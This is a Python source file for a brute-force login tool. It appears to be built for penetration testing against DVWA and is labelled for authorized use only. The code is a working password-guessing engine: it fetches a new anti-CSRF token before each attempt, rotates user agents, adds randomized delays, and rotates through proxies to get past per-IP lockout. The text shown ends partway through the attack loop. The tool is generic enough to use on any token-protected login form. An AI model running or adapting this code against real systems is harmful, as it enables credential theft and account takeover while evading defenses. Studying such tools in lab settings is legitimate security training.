#!/usr/bin/env python3
"""
CSRF-Aware Brute Force Engine v3.0
====================================
A penetration testing tool that bypasses Anti-CSRF token mechanisms
to perform authenticated brute-force attacks against login forms.

Target: DVWA (Damn Vulnerable Web Application) or similar CSRF-protected forms.
Framework Alignment: MITRE ATT&CK T1110.001 (Brute Force: Password Guessing)

AUTHORIZED USE ONLY - Ensure written permission before testing.

v3.0 — Full DVWA-level awareness:
  - Automatic DVWA login (no manual cookies needed)
  - Level-aware config: Low/Medium skip tokens, High uses tokens, Impossible uses POST
  - Correct GET vs POST per security level
  - Optional CSRF token (graceful skip for Low/Medium)
  - Verified failure/success string detection against live DVWA
  - Proxy rotation for Impossible-mode lockout bypass

Algorithm Steps:
  1. Session Initialization & DVWA Authentication
  2. Dynamic Data Retrieval (GET Reconnaissance)
  3. DOM Parsing (Token Extraction — optional per level)
  4. Payload Construction
  5. Execution & Evasion (Jitter, UA Rotation, Proxy Rotation)
  6. Response Analysis
  7. Reset & Loop (Token Invalidation + Re-fetch)
"""

import requests
import re
import sys
import time
import random
import signal
import argparse
from datetime import datetime
from typing import Optional, Tuple, List, Dict
from urllib.parse import urlparse, urlencode, urljoin
from itertools import cycle

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================================================
# ANSI Color Constants
# ============================================================================
class C:
    RST     = "\033[0m"
    BOLD    = "\033[1m"
    DIM     = "\033[2m"
    ULINE   = "\033[4m"
    RED     = "\033[31m"
    GREEN   = "\033[32m"
    YELLOW  = "\033[33m"
    BLUE    = "\033[34m"
    MAGENTA = "\033[35m"
    CYAN    = "\033[36m"
    WHITE   = "\033[37m"
    GREY    = "\033[90m"
    BRED    = "\033[91m"
    BGREEN  = "\033[92m"
    BYELLOW = "\033[93m"
    BBLUE   = "\033[94m"
    BMAGENTA= "\033[95m"
    BCYAN   = "\033[96m"
    BG_RED  = "\033[41m"
    BG_GREEN= "\033[42m"
    BG_YELLOW="\033[43m"
    BG_MAGENTA="\033[45m"

BOX_TL = "╔"; BOX_TR = "╗"; BOX_BL = "╚"; BOX_BR = "╝"
BOX_H  = "═"; BOX_V  = "║"; BOX_ML = "╠"; BOX_MR = "╣"

# ============================================================================
# User-Agent Pool (MITRE ATT&CK T1036.005)
# ============================================================================
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) "
    "Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
]

# ============================================================================
# DVWA Level Presets
# ============================================================================
# These are the ACTUAL parameters for each DVWA security level,
# verified against a live DVWA instance.
DVWA_PRESETS = {
    "low": {
        "method": "GET",
        "has_token": False,
        "description": "No protection — basic brute-force mechanics",
        "defense": "None",
        "bypass": "Direct wordlist iteration, no token handling needed",
    },
    "medium": {
        "method": "GET",
        "has_token": False,
        "description": "Server-side sleep(2) on failure — rate slowing",
        "defense": "sleep(2) delay on each failed attempt",
        "bypass": "Same as Low but slower. sleep() is server-side, cannot be bypassed from client. Conceptual: parallel sessions could help.",
    },
    "high": {
        "method": "GET",
        "has_token": True,
        "description": "CSRF token (user_token) + random sleep(0-3) — token is NOT a real brute-force barrier",
        "defense": "Anti-CSRF token (user_token) + random sleep(0-3)",
        "bypass": "Fetch token per request via GET, inject into payload. The token creates a false sense of security — it's trivially automated.",
    },
    "impossible": {
        "method": "POST",
        "has_token": True,
        "description": "Account lockout after 3 failures (15 min) + CSRF token + POST — brute-force is the WRONG attack vector",
        "defense": "Account lockout (3 failures → 15 min lock), CSRF token, POST method, PDO prepared statements",
        "bypass": "Brute-force is ineffective. Proxy rotation can theoretically bypass per-IP lockout, but the account itself locks. Proper defense. Analyze for DoS potential instead.",
    },
}


# ============================================================================
# Proxy Pool (MITRE ATT&CK T1090.002)
# ============================================================================
class ProxyPool:
    def __init__(self, proxy_file: Optional[str] = None, threshold: int = 2):
        self.proxies: List[str] = []
        self.threshold = threshold
        self._cycle = None
        self._current_proxy: Optional[str] = None
        self._current_count = 0
        self._dead_proxies: set = set()
        if proxy_file:
            self._load(proxy_file)

    def _load(self, filepath: str):
        try:
            with open(filepath, "r") as f:
                for line in f:
                    proxy = line.strip()
                    if proxy and not proxy.startswith("#"):
                        if not proxy.startswith(("http://", "https://", "socks")):
                            proxy = "http://" + proxy
                        self.proxies.append(proxy)
        except FileNotFoundError:
            print(f"  {C.BRED}[!]{C.RST} Proxy file not found: {filepath}")
            return
        if self.proxies:
            random.shuffle(self.proxies)
            self._cycle = cycle(self.proxies)
            self._current_proxy = next(self._cycle)
            self._current_count = 0
            print(
                f"  {C.GREEN}[PROXY]{C.RST} Loaded {C.BCYAN}{len(self.proxies)}{C.RST} "
                f"proxies, rotating every {C.CYAN}{self.threshold}{C.RST} attempts"
            )

    @property
    def is_active(self) -> bool:
        return len(self.proxies) > 0

    def get_proxy_dict(self) -> Optional[dict]:
        if not self.is_active or not self._current_proxy:
            return None
        return {"http": self._current_proxy, "https": self._current_proxy}

    def mark_used(self):
        if not self.is_active:
            return
        self._current_count += 1
        if self._current_count >= self.threshold:
            self._rotate()

    def mark_dead(self):
        if not self.is_active or not self._current_proxy:
            return
        self._dead_proxies.add(self._current_proxy)
        self._rotate()

    def _rotate(self):
        if not self._cycle:
            return
        for _ in range(len(self.proxies)):
            candidate = next(self._cycle)
            if candidate not in self._dead_proxies:
                self._current_proxy = candidate
                self._current_count = 0
                return
        print(f"  {C.BRED}[PROXY]{C.RST} All proxies exhausted!")
        self._current_proxy = None

    @property
    def current(self) -> Optional[str]:
        return self._current_proxy

    @property
    def alive_count(self) -> int:
        return len(self.proxies) - len(self._dead_proxies)


# ============================================================================
# Results Cache
# ============================================================================
class ResultsCache:
    def __init__(self):
        self.attempts: List[Dict] = []
        self.successes: List[Dict] = []
        self.start_time: Optional[datetime] = None
        self.target_url: str = ""
        self.username: str = ""

    def record_attempt(self, password: str, success: bool, status_code: int, elapsed_ms: float):
        entry = {
            "password": password,
            "success": success,
            "status_code": status_code,
            "elapsed_ms": elapsed_ms,
            "timestamp": datetime.now(),
        }
        self.attempts.append(entry)
        if success:
            self.successes.append(entry)

    def print_summary(self):
        total = len(self.attempts)
        if total == 0:
            print(f"\n{C.YELLOW}  No attempts were made.{C.RST}")
            return

        elapsed = (datetime.now() - self.start_time).total_seconds() if self.start_time else 0
        success_count = len(self.successes)
        fail_count = total - success_count
        rate = total / elapsed if elapsed > 0 else 0

        w = 65
        print()
        print(f"{C.CYAN}{BOX_TL}{BOX_H * (w - 2)}{BOX_TR}{C.RST}")
        print(f"{C.CYAN}{BOX_V}{C.RST}{C.BOLD}{C.BCYAN}  {'SESSION SUMMARY':^{w - 4}}{C.RST}{C.CYAN}{BOX_V}{C.RST}")
        print(f"{C.CYAN}{BOX_ML}{BOX_H * (w - 2)}{BOX_MR}{C.RST}")

        def row(label, value, color=""):
            val_str = f"{color}{value}{C.RST}" if color else str(value)
            raw_len = len(str(value))
            pad = max(0, w - 20 - raw_len)
            print(f"{C.CYAN}{BOX_V}{C.RST}  {label:<12} {C.DIM}:{C.RST}  {val_str}{' ' * pad}{C.CYAN}{BOX_V}{C.RST}")

        row("Target",     self.target_url[:w - 22])
        row("Username",   self.username)
        row("Attempts",   total)
        row("Duration",   f"{elapsed:.1f}s")
        row("Rate",       f"{rate:.2f} req/s")
        row("Failed",     fail_count, C.RED)
        row("Cracked",    success_count, C.BGREEN if success_count > 0 else C.RED)

        if self.successes:
            print(f"{C.CYAN}{BOX_ML}{BOX_H * (w - 2)}{BOX_MR}{C.RST}")
            print(f"{C.CYAN}{BOX_V}{C.RST}{C.BOLD}{C.BGREEN}  🔓 CRACKED CREDENTIALS{' ' * (w - 27)}{C.RST}{C.CYAN}{BOX_V}{C.RST}")
            print(f"{C.CYAN}{BOX_ML}{BOX_H * (w - 2)}{BOX_MR}{C.RST}")
            for i, s in enumerate(self.successes, 1):
                ts = s['timestamp'].strftime('%H:%M:%S')
                idx = self.attempts.index(s) + 1
                print(
                    f"{C.CYAN}{BOX_V}{C.RST}"
                    f"  {C.BGREEN}{C.BOLD}[{i}]{C.RST}  "
                    f"{C.WHITE}{self.username}{C.RST} : "
                    f"{C.BGREEN}{C.BOLD}{s['password']}{C.RST}"
                    f"{C.DIM}  (attempt #{idx} @ {ts}){C.RST}"
                )
        else:
            print(f"{C.CYAN}{BOX_ML}{BOX_H * (w - 2)}{BOX_MR}{C.RST}")
            print(f"{C.CYAN}{BOX_V}{C.RST}{C.YELLOW}  No credentials were cracked.{' ' * (w - 33)}{C.RST}{C.CYAN}{BOX_V}{C.RST}")

        print(f"{C.CYAN}{BOX_BL}{BOX_H * (w - 2)}{BOX_BR}{C.RST}")
        print()


# Global state
_results_cache = ResultsCache()
_interrupted = False


def _signal_handler(signum, frame):
    global _interrupted
    _interrupted = True
    print(f"\n\n{C.BYELLOW}{C.BOLD}  ⚡ Interrupted by user (Ctrl+C){C.RST}")
    print(f"{C.YELLOW}  Stopping attack loop... preparing summary{C.RST}")


# ============================================================================
# Terminal UI
# ============================================================================
def print_attempt(
    attempt_num: int, total: int, username: str, password: str,
    success: bool, status_code: int, proxy_addr: Optional[str] = None
):
    pct = (attempt_num / total) * 100 if total > 0 else 0
    bar_w = 20
    filled = int(bar_w * attempt_num / total) if total > 0 else 0
    bar = f"{C.GREEN}{'█' * filled}{C.GREY}{'░' * (bar_w - filled)}{C.RST}"
    progress = f"{C.DIM}[{attempt_num}/{total}]{C.RST}"
    pct_str = f"{C.DIM}{pct:5.1f}%{C.RST}"

    px = ""
    if proxy_addr:
        short = proxy_addr.replace("http://", "").replace("https://", "").replace("socks5://", "").replace("socks4://", "")
        px = f" {C.DIM}via {short}{C.RST}"

    if success:
        tag = f"{C.BG_GREEN}{C.BOLD}{C.WHITE} FOUND {C.RST}"
        cred = f"{C.BGREEN}{C.BOLD}{username}{C.RST} : {C.BGREEN}{C.BOLD}{password}{C.RST}"
        status = f"{C.GREEN}HTTP {status_code}{C.RST}"
        print(f"  {tag}  {progress} {bar} {pct_str}  {cred}  {status}{px}")
    else:
        tag = f"{C.BG_RED}{C.WHITE}{C.BOLD} PASS  {C.RST}"
        cred = f"{C.DIM}{username}{C.RST} : {C.WHITE}{password}{C.RST}"
        status = f"{C.DIM}HTTP {status_code}{C.RST}"
        print(f"  {tag}  {progress} {bar} {pct_str}  {cred}  {status}{px}")


def print_banner(
    target_url: str, username: str, wordlist_path: str,
    total_passwords: int, token_name: str, method: str,
    has_token: bool, security_level: Optional[str],
    jitter_range: Tuple[float, float], rotate_ua: bool,
    proxy: Optional[str], proxy_pool: Optional[ProxyPool] = None,
    has_cookies: bool = False
):
    w = 65

    print()
    print(f"{C.MAGENTA}{BOX_TL}{BOX_H * (w - 2)}{BOX_TR}{C.RST}")
    print(f"{C.MAGENTA}{BOX_V}{C.RST}  {C.BOLD}{C.BMAGENTA}⚔  CSRF-Aware Brute Force Engine v3.0{' ' * (w - 42)}{C.RST}{C.MAGENTA}{BOX_V}{C.RST}")
    print(f"{C.MAGENTA}{BOX_V}{C.RST}  {C.DIM}MITRE ATT&CK: T1110.001 | Cyber Kill Chain: Exploitation{' ' * (w - 62)}{C.RST}{C.MAGENTA}{BOX_V}{C.RST}")
    print(f"{C.MAGENTA}{BOX_ML}{BOX_H * (w - 2)}{BOX_MR}{C.RST}")

    token_info = f"{token_name} (auto-refresh)" if has_token else "None (not required)"

    configs = [
        ("Target",     target_url),
        ("Method",     f"{method} (payload as {'URL params' if method == 'GET' else 'POST body'})"),
        ("Username",   username),
        ("Wordlist",   f"{wordlist_path} ({total_passwords} passwords)"),
        ("CSRF Token", token_info),
        ("Jitter",     f"{jitter_range[0]:.1f}s — {jitter_range[1]:.1f}s"),
        ("UA Rotate",  "Enabled ✓" if rotate_ua else "Disabled ✗"),
    ]

    if security_level:
        preset = DVWA_PRESETS.get(security_level, {})
        desc = preset.get("description", security_level)
        configs.append(("DVWA Level", f"{security_level} — {desc}"))

    auth_mode = "Cookie injection" if has_cookies else "Auto-login"
    configs.append(("Auth", auth_mode))

    if proxy_pool and proxy_pool.is_active:
        configs.append(("Proxy Pool", f"{proxy_pool.alive_count} proxies (rotate every {proxy_pool.threshold} attempts)"))
    elif proxy:
        configs.append(("Proxy", proxy))
    else:
        configs.append(("Proxy", "Direct connection"))

    for label, value in configs:
        max_val = w - 20
        display = value if len(value) <= max_val else value[:max_val - 3] + "..."
        print(f"{C.MAGENTA}{BOX_V}{C.RST}  {C.CYAN}{label:<12}{C.RST}{C.DIM}:{C.RST} {display}")

    print(f"{C.MAGENTA}{BOX_ML}{BOX_H * (w - 2)}{BOX_MR}{C.RST}")
    print(f"{C.MAGENTA}{BOX_V}{C.RST}  {C.BYELLOW}⚠  AUTHORIZED PENETRATION TESTING USE ONLY{' ' * (w - 48)}{C.RST}{C.MAGENTA}{BOX_V}{C.RST}")
    print(f"{C.MAGENTA}{BOX_BL}{BOX_H * (w - 2)}{BOX_BR}{C.RST}")
    print()


# ============================================================================
# DVWA Authentication
# ============================================================================
def parse_cookie_string(cookie_str: str) -> dict:
    cookies = {}
    if not cookie_str:
        return cookies
    for part in cookie_str.split(";"):
        part = part.strip()
        if "=" in part:
            key, value = part.split("=", 1)
            cookies[key.strip()] = value.strip()
    return cookies


def dvwa_auto_login(
    session: requests.Session,
    target_url: str,
    dvwa_user: str = "admin",
    dvwa_pass: str = "password",
    verbose: bool = False
) -> bool:
    """Log into DVWA with default credentials (admin/password)."""
    parsed = urlparse(target_url)
    base = f"{parsed.scheme}://{parsed.netloc}"
    # Detect DVWA subdirectory (e.g., /DVWA/vulnerabilities/brute/)
    path_parts = parsed.path.strip("/").split("/")
    dvwa_base = base
    for part in path_parts:
        if part.upper() == "DVWA":
            dvwa_base = f"{base}/{part}"
            break

    login_page_url = f"{dvwa_base}/login.php"
    print(f"  {C.CYAN}[AUTH]{C.RST} Auto-login to DVWA at {C.DIM}{login_page_url}{C.RST}")

    try:
        resp = session.get(login_page_url, timeout=15)
        resp.raise_for_status()

        # Extract CSRF token from login page
        token_match = re.search(
            r"name=['\"]?user_token['\"]?\s+value=['\"]?([a-fA-F0-9]+)",
            resp.text, re.IGNORECASE
        )
        if not token_match:
            token_match = re.search(
                r"value=['\"]?([a-fA-F0-9]+)['\"]?\s+name=['\"]?user_token",
                resp.text, re.IGNORECASE
            )
        if not token_match:
            print(f"  {C.BYELLOW}[AUTH]{C.RST} No CSRF token on DVWA login page")
            print(f"         {C.DIM}Use --cookie to inject your own session cookies{C.RST}")
            return False

        login_token = token_match.group(1)
        login_data = {
            "username": dvwa_user,
            "password": dvwa_pass,
            "Login": "Login",
            "user_token": login_token,
        }

        login_resp = session.post(
            login_page_url, data=login_data,
            allow_redirects=True, timeout=15
        )

        if "login.php" in login_resp.url and "login failed" in login_resp.text.lower():
            print(f"  {C.BRED}[AUTH FAIL]{C.RST} DVWA login failed with {dvwa_user}:{dvwa_pass}")
            return False

        print(
            f"  {C.BGREEN}[AUTH]{C.RST} Logged into DVWA as {C.BOLD}{dvwa_user}{C.RST} "
            f"{C.DIM}| PHPSESSID={dict(session.cookies).get('PHPSESSID', '?')}{C.RST}"
        )
        return True

    except requests.RequestException as e:
        print(f"  {C.BRED}[AUTH FAIL]{C.RST} Could not reach DVWA login: {e}")
        return False


# ============================================================================
# STEP 1: Session Initialization
# ============================================================================
def init_session(
    target_url: str,
    proxy: Optional[str] = None,
    proxy_dict: Optional[dict] = None,
    cookies: Optional[str] = None,
    security_level: Optional[str] = None,
    dvwa_auto: bool = True,
    verbose: bool = False
) -> requests.Session:
    """Initialize HTTP session with authentication."""
    session = requests.Session()

    effective_proxy = proxy_dict or ({"http": proxy, "https": proxy} if proxy else None)
    if effective_proxy:
        session.proxies = effective_proxy
        session.verify = False

    session.headers.update({
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
    })

    parsed = urlparse(target_url)
    base_url = f"{parsed.scheme}://{parsed.netloc}"

    try:
        session.get(base_url, timeout=15)
    except requests.RequestException as e:
        print(f"  {C.BRED}[STEP 1 FAIL]{C.RST} Connection failed: {e}")
        raise SystemExit(f"[!] Cannot reach target: {e}")

    # Authentication
    if cookies:
        parsed_cookies = parse_cookie_string(cookies)
        for name, value in parsed_cookies.items():
            session.cookies.set(name, value)
        print(
            f"  {C.GREEN}[STEP 1]{C.RST} Session initialized with injected cookies "
            f"{C.DIM}|{C.RST} {C.CYAN}{parsed_cookies}{C.RST}"
        )
    elif dvwa_auto:
        print(
            f"  {C.GREEN}[STEP 1]{C.RST} Session initialized "
            f"{C.DIM}|{C.RST} Cookies: {C.CYAN}{dict(session.cookies)}{C.RST}"
        )
        dvwa_auto_login(session, target_url, verbose=verbose)
    else:
        print(
            f"  {C.GREEN}[STEP 1]{C.RST} Session initialized "
            f"{C.DIM}|{C.RST} Cookies: {C.CYAN}{dict(session.cookies)}{C.RST}"
        )

    if security_level:
        # CRITICAL: DVWA sets 'security=impossible' as a server cookie on
        # initial page load. We must REMOVE the old cookie first before
        # setting our desired level, otherwise requests sends BOTH cookies
        # and the server's 'impossible' takes precedence.
        # Clear any existing 'security' cookies from the jar
        to_remove = [c for c in session.cookies if c.name == "security"]
        for c in to_remove:
            session.cookies.clear(c.domain, c.path, c.name)
        session.cookies.set("security", security_level)
        print(
            f"  {C.CYAN}[STEP 1]{C.RST} DVWA security level → "
            f"{C.BOLD}{security_level}{C.RST}"
        )

    return session


# ============================================================================
# STEP 2 & 3: Fetch Page + Extract Token (OPTIONAL per level)
# ============================================================================
def fetch_csrf_token(
    session: requests.Session,
    login_url: str,
    token_name: str = "user_token",
    required: bool = True,
    verbose: bool = False
) -> Optional[str]:
    """
    Fetch login page and extract CSRF token.
    
    Returns None (instead of raising) if token not found and required=False.
    This allows Low/Medium levels to work without tokens.
    """
    try:
        response = session.get(login_url, timeout=15)
        response.raise_for_status()
    except requests.RequestException as e:
        if verbose:
            print(f"  {C.BRED}[STEP 2 FAIL]{C.RST} GET failed: {e}")
        raise

    if verbose:
        print(
            f"  {C.CYAN}[STEP 2]{C.RST} Page fetched {C.DIM}|{C.RST} "
            f"Status: {response.status_code} {C.DIM}|{C.RST} "
            f"Size: {len(response.text)} bytes"
        )

    # Try to extract token
    patterns = [
        rf"name=['\"]?{re.escape(token_name)}['\"]?\s+value=['\"]?([a-fA-F0-9]+)['\"]?",
        rf"value=['\"]?([a-fA-F0-9]+)['\"]?\s+name=['\"]?{re.escape(token_name)}['\"]?",
        rf"name\s*=\s*['\"]?{re.escape(token_name)}['\"]?[^>]*value\s*=\s*['\"]?([a-fA-F0-9]+)['\"]?",
        rf"value\s*=\s*['\"]?([a-fA-F0-9]+)['\"]?[^>]*name\s*=\s*['\"]?{re.escape(token_name)}['\"]?",
    ]

    for pattern in patterns:
        match = re.search(pattern, response.text, re.IGNORECASE)
        if match:
            token = match.group(1)
            if verbose:
                print(
                    f"  {C.CYAN}[STEP 3]{C.RST} Token extracted {C.DIM}|{C.RST} "
                    f"{token_name}={token[:8]}...{token[-4:]}"
                )
            return token

    # Token not found
    if required:
        if verbose:
            print(f"  {C.BRED}[STEP 3 FAIL]{C.RST} Token '{token_name}' not found")
        raise ValueError(f"CSRF token '{token_name}' not found in response.")
    else:
        if verbose:
            print(f"  {C.DIM}[STEP 3] No token found (not required for this level){C.RST}")
        return None


# ============================================================================
# STEP 4: Payload Construction
# ============================================================================
def build_payload(
    username: str, password: str,
    csrf_token: Optional[str] = None,
    token_name: str = "user_token",
    extra_params: Optional[dict] = None
) -> dict:
    """Build payload. Token is only included if not None."""
    payload = {
        "username": username,
        "password": password,
    }

    # Only add token if present (Low/Medium don't have one)
    if csrf_token is not None:
        payload[token_name] = csrf_token

    if extra_params:
        payload.update(extra_params)
    else:
        payload["Login"] = "Login"

    return payload


# ============================================================================
# STEP 5: Execution & Evasion
# ============================================================================
def execute_attempt(
    session: requests.Session,
    login_url: str,
    payload: dict,
    method: str = "GET",
    jitter_range: Tuple[float, float] = (0.5, 2.0),
    rotate_ua: bool = True,
    verbose: bool = False
) -> requests.Response:
    """
    Send the login attempt.
    GET  → payload as URL query parameters (Low/Medium/High)
    POST → payload as form body (Impossible, login.php)
    """
    delay = random.uniform(*jitter_range)
    if verbose:
        print(f"  {C.YELLOW}[STEP 5]{C.RST} Jitter: {delay:.2f}s")

    remaining = delay
    while remaining > 0 and not _interrupted:
        chunk = min(remaining, 0.1)
        time.sleep(chunk)
        remaining -= chunk

    if _interrupted:
        raise KeyboardInterrupt("Interrupted during jitter")

    if rotate_ua:
        session.headers["User-Agent"] = random.choice(USER_AGENTS)

    session.headers["Referer"] = login_url

    try:
        if method.upper() == "GET":
            response = session.get(
                login_url, params=payload,
                allow_redirects=True, timeout=15
            )
        else:
            response = session.post(
                login_url, data=payload,
                allow_redirects=True, timeout=15
            )
    except requests.RequestException as e:
        if verbose:
            print(f"  {C.BRED}[STEP 5 FAIL]{C.RST} {method} failed: {e}")
        raise

    if verbose:
        print(
            f"  {C.YELLOW}[STEP 5]{C.RST} {method} sent {C.DIM}|{C.RST} "
            f"Status: {response.status_code} {C.DIM}|{C.RST} "
            f"Size: {len(response.text)} bytes"
        )
    return response


# ============================================================================
# STEP 6: Response Analysis
# ============================================================================

# DVWA verified strings (tested against live instance):
DVWA_FAILURE_STRING = "Username and/or password incorrect"
DVWA_SUCCESS_STRING = "Welcome to the password protected area"

def analyze_response(
    response: requests.Response,
    failure_string: str = DVWA_FAILURE_STRING,
    success_string: str = DVWA_SUCCESS_STRING,
    verbose: bool = False
) -> bool:
    """
    Analyze response to determine success/failure.
    
    STRICT matching — no heuristic fallbacks.
    
    Why no "logout" / "sign out" heuristics:
      DVWA's navigation sidebar contains a "Logout" link on EVERY
      authenticated page. Using it as a success indicator causes
      100% false positives. We rely ONLY on the verified strings.
    
    Verified DVWA behavior:
    - Success: body contains "Welcome to the password protected area"
    - Failure: body contains "Username and/or password incorrect"
    - Lockout: body contains "locked out" / "too many failed"
    """
    status = response.status_code
    body = response.text

    # PRIMARY CHECK: Look for the SUCCESS string
    if success_string.lower() in body.lower():
        if verbose:
            print(f"  {C.BGREEN}[STEP 6]{C.RST} ✓ SUCCESS — '{success_string}' found in response")
        return True

    # Check for explicit failure
    if failure_string.lower() in body.lower():
        if verbose:
            print(f"  {C.DIM}[STEP 6] ✗ Failure string matched{C.RST}")
        return False

    # Check for lockout (DVWA Impossible level)
    if "locked out" in body.lower() or "too many failed" in body.lower() or "account has been locked" in body.lower():
        if verbose:
            print(f"  {C.BYELLOW}[STEP 6]{C.RST} ⚠ Account lockout detected")
        return False

    # HTTP redirect (non-DVWA targets)
    if status in (301, 302):
        location = response.headers.get("Location", "")
        if verbose:
            print(f"  {C.CYAN}[STEP 6]{C.RST} Redirect → {location}")
        if "login" not in location.lower():
            return True

    # No match: neither success nor failure string found.
    # This happens when: wrong method, no auth, page didn't process the request.
    if verbose:
        print(f"  {C.DIM}[STEP 6] No success/failure string matched — treating as failure{C.RST}")
    return False


# ============================================================================
# STEP 7: Main Attack Loop
# ============================================================================
def load_wordlist(filepath: str) -> list:
    passwords = []
    try:
        with open(filepath, "r", encoding="utf-8", errors="replace") as f:
            for line in f:
                pwd = line.strip()
                if pwd and not pwd.startswith("#"):
                    passwords.append(pwd)
    except FileNotFoundError:
        raise SystemExit(f"[!] Wordlist not found: {filepath}")
    except PermissionError:
        raise SystemExit(f"[!] Permission denied: {filepath}")
    return passwords


def run_attack(
    target_url: str,
    username: str,
    wordlist_path: str,
    method: Optional[str] = None,
    token_name: str = "user_token",
    has_token: Optional[bool] = None,
    failure_string: str = DVWA_FAILURE_STRING,
    success_string: str = DVWA_SUCCESS_STRING,
    jitter_range: Tuple[float, float] = (0.5, 2.0),
    rotate_ua: bool = True,
    proxy: Optional[str] = None,
    proxy_file: Optional[str] = None,
    lockout_threshold: int = 2,
    cookies: Optional[str] = None,
    security_level: Optional[str] = None,
    verbose: bool = False,
    output_file: Optional[str] = None,
) -> Optional[str]:
    """
    Main attack orchestrator.
    
    Level-aware: automatically configures method, token handling,
    and attack parameters based on --security level.
    """
    global _interrupted, _results_cache
    _interrupted = False

    original_handler = signal.getsignal(signal.SIGINT)
    signal.signal(signal.SIGINT, _signal_handler)

    # Normalize URL
    login_url = target_url.rstrip("/")
    if not login_url.startswith("http"):
        login_url = "http://" + login_url

    # Apply DVWA level presets
    if security_level and security_level in DVWA_PRESETS:
        preset = DVWA_PRESETS[security_level]
        if method is None:
            method = preset["method"]
        if has_token is None:
            has_token = preset["has_token"]
        print(
            f"\n  {C.BMAGENTA}[LEVEL]{C.RST} DVWA {C.BOLD}{security_level}{C.RST} → "
            f"Method: {C.CYAN}{method}{C.RST}, "
            f"Token: {C.CYAN}{'Yes' if has_token else 'No'}{C.RST}"
        )
        print(f"  {C.DIM}         Defense: {preset['defense']}{C.RST}")
        print(f"  {C.DIM}         Bypass:  {preset['bypass']}{C.RST}")

        # Warn about Impossible level
        if security_level == "impossible":
            print(
                f"\n  {C.BYELLOW}{C.BOLD}  ⚠  WARNING: Brute-force is the WRONG attack vector for Impossible level.{C.RST}"
            )
            print(
                f"  {C.YELLOW}     The account locks after 3 failures. Consider analyzing for DoS instead.{C.RST}\n"
            )

    # Defaults if not set by preset
    if method is None:
        method = "GET"
    if has_token is None:
        has_token = True  # Safe default: try to extract token

    # Load wordlist
    passwords = load_wordlist(wordlist_path)
    total = len(passwords)

    # Proxy pool
    proxy_pool = ProxyPool(proxy_file, threshold=lockout_threshold) if proxy_file else None

    # Cache
    _results_cache = ResultsCache()
    _results_cache.target_url = login_url
    _results_cache.username = username
    _results_cache.start_time = datetime.now()

    # Banner
    print_banner(
        target_url=login_url, username=username,
        wordlist_path=wordlist_path, total_passwords=total,
        token_name=token_name, method=method.upper(),
        has_token=has_token, security_level=security_level,
        jitter_range=jitter_range, rotate_ua=rotate_ua,
        proxy=proxy, proxy_pool=proxy_pool,
        has_cookies=bool(cookies)
    )

    if total == 0:
        print(f"  {C.BRED}[!]{C.RST} Wordlist is empty. Aborting.")
        _results_cache.print_summary()
        signal.signal(signal.SIGINT, original_handler)
        return None

    # STEP 1: Session
    print(f"  {C.GREEN}▶{C.RST} Initializing session...\n")
    if proxy_pool and proxy_pool.is_active:
        session = init_session(
            login_url, proxy_dict=proxy_pool.get_proxy_dict(),
            cookies=cookies, security_level=security_level, verbose=verbose
        )
    else:
        session = init_session(
            login_url, proxy=proxy,
            cookies=cookies, security_level=security_level, verbose=verbose
        )

    print()
    cracked_password = None

    try:
        for attempt, password in enumerate(passwords, 1):
            if _interrupted:
                break

            attempt_start = time.time()
            current_proxy_addr = proxy_pool.current if proxy_pool and proxy_pool.is_active else None

            try:
                # Apply proxy pool
                if proxy_pool and proxy_pool.is_active:
                    pd = proxy_pool.get_proxy_dict()
                    if pd:
                        session.proxies = pd
                        session.verify = False
                    else:
                        session.proxies = {}
                        print(f"  {C.BYELLOW}[!]{C.RST} All proxies dead → direct connection")

                # STEP 2+3: Token (optional based on level)
                csrf_token = None
                if has_token:
                    csrf_token = fetch_csrf_token(
                        session, login_url,
                        token_name=token_name,
                        required=True,
                        verbose=verbose
                    )
                else:
                    if verbose:
                        print(f"  {C.DIM}[STEP 2+3] Token not required, skipping{C.RST}")

                # STEP 4: Payload
                payload = build_payload(
                    username=username, password=password,
                    csrf_token=csrf_token, token_name=token_name
                )
                if verbose:
                    print(
                        f"  {C.YELLOW}[STEP 4]{C.RST} Payload built {C.DIM}|{C.RST} "
                        f"Params: {list(payload.keys())}"
                    )

                # STEP 5: Execute
                response = execute_attempt(
                    session, login_url, payload,
                    method=method,
                    jitter_range=jitter_range,
                    rotate_ua=rotate_ua,
                    verbose=verbose
                )

                # STEP 6: Analyze
                success = analyze_response(
                    response,
                    failure_string=failure_string,
                    success_string=success_string,
                    verbose=verbose
                )

                elapsed_ms = (time.time() - attempt_start) * 1000

                _results_cache.record_attempt(
                    password=password, success=success,
                    status_code=response.status_code, elapsed_ms=elapsed_ms
                )

                print_attempt(
                    attempt_num=attempt, total=total,
                    username=username, password=password,
                    success=success, status_code=response.status_code,
                    proxy_addr=current_proxy_addr
                )

                if success:
                    cracked_password = password
                    if output_file:
                        elapsed = (datetime.now() - _results_cache.start_time).total_seconds()
                        with open(output_file, "a") as f:
                            f.write(
                                f"[{datetime.now().isoformat()}] "
                                f"{username}:{password} "
                                f"({attempt} attempts, {elapsed:.1f}s)\n"
                            )
                    break  # ═══ CREDENTIAL FOUND — BREAK ═══

                # STEP 7: Reset
                if csrf_token is not None:
                    del csrf_token
                if proxy_pool and proxy_pool.is_active:
                    proxy_pool.mark_used()
                    if proxy_pool.current != current_proxy_addr:
                        if verbose:
